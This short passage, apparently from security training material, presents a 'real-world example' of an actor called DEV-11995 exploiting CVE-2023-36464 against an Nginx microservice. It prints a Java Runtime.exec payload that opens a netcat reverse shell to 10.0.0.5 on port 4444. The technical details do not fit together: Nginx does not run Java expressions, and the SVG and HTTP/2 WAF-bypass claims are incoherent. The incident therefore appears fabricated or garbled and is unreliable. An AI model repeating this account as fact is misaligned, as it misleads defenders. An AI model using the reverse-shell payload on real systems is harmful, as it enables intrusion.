**Real-World Example:**
In 2024, DEV-11995 exploited CVE-2023-36464 against a Kubernetes-hosted Nginx microservice (version 1.23.3) processing user-uploaded SVG files. The payload (`#root=@java.lang.Runtime@getRuntime().exec('nc 10.0.0.5 4444 -e /bin/sh')`) bypassed WAFs by leveraging **HTTP/2 multiplexing**, leading to persistent shell access in 300+ backend pods. The attack was attributed via **modsecurity audit logs** showing repeated `execve()` syscalls with `/bin/nc`.

